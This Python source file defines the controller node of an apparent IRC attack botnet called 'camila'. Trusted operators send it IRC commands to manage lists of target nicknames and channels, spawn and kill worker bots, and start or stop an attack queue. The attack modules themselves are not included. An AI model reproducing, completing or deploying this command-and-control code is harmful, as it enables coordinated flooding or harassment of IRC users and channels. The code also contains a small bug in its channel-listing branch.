#!/bin/python

import hashlib
import random
import socket
import ssl
import string
import threading
import time

import eventnotifier
import irctargetedsocket

class IRCNode(irctargetedsocket.IRCTargetedSocket):
	def __init__(self, server, port=6667, proxy=None, proxy_port=None, thread_count=1,
		     channels=[], attack_names=[], ignore_names=[], trusted_names=[],
		     ipv6=False, ssl=False, vhost=None, nick=None, password=None):

		irctargetedsocket.IRCTargetedSocket.__init__(self, server, port, proxy,
							     proxy_port, channels, attack_names,
							     ignore_names, trusted_names, ipv6,
							     ssl, vhost, nick, password)

		self.setNotifier(eventnotifier.EventNotifier())
		self.getNotifier().subscribe(self)

		self.setThreadCount(thread_count)
		self.setNodes([])

		self.setContext("camila")
		self.sendStatus(vars(self))

		self.commands = {
			"-a" : ["add", "remove", "list"], # Attack Names
			"-c" : ["add", "remove", "list"], # Attack Channels
			"-g" : [], # Generate workers
			"-i" : ["add", "remove", "list"], # Ignore Names
			"-k" : [], # Kill workers
			"--modules" : ["list"],
			"--status" : [], # Status,
			"-T" : ["add", "remove", "list"], # Trusted Names
			"--attack" : ["add", "remove", "list", "start", "stop"] # Attack Queue
		}

		self.banner = [
"******************************************************************************************\n",
"*       ######       #            #         #       #########  #               #         *\n",
"*      #            # #          # #       # #          #      #              # #        *\n",
"*     #            #   #        #   #     #   #         #      #             #   #       *\n",
"*     #           #######      #     #   #     #        #      #            #######      *\n",
"*      #         #       #    #       # #       #       #      #           #       #     *\n",
"*       ######  #         #  #         #         #  #########  #########  #         #    *\n",
"******************************************************************************************\n"
]
	
	def event(self, line):
		super(IRCNode, self).event(line)

		args = line.split()

		# Exception and code handling
		c = self.getCodes()
		if args[1] in c:
			s = c[args[1]]

			# Server connected
			if s  == "RPL_WELCOME":
				if self.getNickname() == self.getContext():
					for name in self.getTrustedNames():
						for line in self.banner:
							self.sendMessage(name, line)

	def processCommand(self, target, message):
		super(IRCNode, self).processCommand(target, message)

		command = message.split()
		t = self.getTrustedNames()

		if t == None or t == []:
			return	

		if target in t and command[0] == self.getContext() and command[1] in self.getCommands():
			c = self.getCommands()

			# Attack Names
			if command[1] == "-a":
				l = self.getAttackNames()

				# Add attack names
				if command[2] == "add":
					names = command[3:]
					self.getNotifier().publish(0, target, names)
					self.listNames(target, "attack_names", l)
				
				# Remove attack names
				elif command[2] == "remove":
					names = command[3:]
					self.getNotifier().publish(1, target, names)
					self.listNames(target, "attack_names", l)

				# List attack names
				elif command[2] == "list":
					self.listNames(target, "attack_names", self.getAttackNames())

			# Ignore Names
			elif command[1] == "-i":
				l = self.getIgnoreNames()

				# Add ignore names
				if command[2] == "add":
					names = command[3:]
					self.getNotifier().publish(3, target, names)
					self.listNames(target, "ignore_names", l)
				
				# Remove ignore names
				elif command[2] == "remove":
					names = command[3:]
					self.getNotifier().publish(4, target, names)
					self.listNames(target, "ignore_names", l)

				# List ignore names
				elif command[2] == "list":
					self.listNames(target, "ignore_names", self.getIgnoreNames())

			# Trusted Names
			elif command[1] == "-T":
				l = self.getTrustedNames()

				# Add trusted names
				if command[2] == "add":
					names = command[3:]
					self.getNotifier().publish(6, target, names)
					self.listNames(target, "trusted_names", l)
				
				# Remove trusted names
				elif command[2] == "remove":
					names = command[3:]
					self.getNotifier().publish(7, target, names)
					self.listNames(target, "trusted_names", l)

				# List trusted names
				elif command[2] == "list":
					self.listNames(target, "trusted_names", self.getTrustedNames())

			# Attack Channels
			elif command[1] == "-c":
				l = self.getChannels()

				# Add attack channels
				if command[2] == "add":
					names = command[3:]
					self.getNotifier().publish(9, target, names)
					self.listNames(target, "channels", l)

				# Remove attack channels
				elif command[2] == "remove":
					names = command[3:]
					self.getNotifier().publish(10, target, names)
					self.listNames(target, "channels", l)

				# List attack channels
				elif command[2] == "list":
					self.getNotifier().publish(11, target, names)

			# Kill workers
			elif command[1] == "-k":
				names = command[2:]
				if names == []:
					names = self.getNodeNames()

				self.getNotifier().publish(12, target, names)
			
			# Modules
			elif command[1].lower() == '--modules':
				l = []
				for m in self.getModules():
					module_name = str(m).split()[0].replace("[", "").replace("<", "")
					s = "{0}@{1}".format(m.getModuleName(), module_name)
					l.append(s)

				if command[2].lower() == 'list':
					self.listNames(target, "modules", l)
				
			# Status
			elif command[1].lower() == '--status':
				self.listNames(target, "attack_names", self.getAttackNames())
				self.listNames(target, "ignore_names", self.getIgnoreNames())
				self.listNames(target, "trusted_names", self.getTrustedNames())
				self.listNames(target, "channels", self.getChannels())
				self.listNames(target, "nodes", self.getNodeNames())

				l = []
				for m in self.getModules():
					module_name = str(m).split()[0].replace("[", "").replace("<", "")
					s = "{0}@{1}".format(m.getModuleName(), module_name)
					l.append(s)
				self.listNames(target, "modules", l)

				#self.listNames(target, "attack_queue", )


			elif command[1] == "--attack":
				l = self.getAttackQueue()

				if command[2] == "add":
					self.getNotifier().publish(15, "", command[3:])
					self.listNames(target, "attack_queue", l)

				elif command[2] == "remove":
					self.getNotifier().publish(16, "", command[3:])
					self.listNames(target, "attack_queue", l)

				elif command[2] == "list":
					self.listNames(target, "attack_queue", l)

				elif command[2] == "start":
					self.getNotifier().publish(13, "", command[3:])

				elif command[2] == "stop":
					self.getNotifier().publish(14, "", command[3:])

		else:
			pass


	def inform(self, event, target, data):
		super(IRCNode, self).inform(event, target, data)

		if event == 12: #KILL_NODES
			if target == None or target == self.getNickname():
				self.quit()
			else:
				self.listRemove(data, self.getNodeNames())

				for w in self.getNodes():
					if w.getNickname() in data:
						self.getNodes().remove(w)
						w.quit()

	def getThreadCount(self):
		return self.thread_count

	def setThreadCount(self, thread_count):
		self.thread_count = thread_count

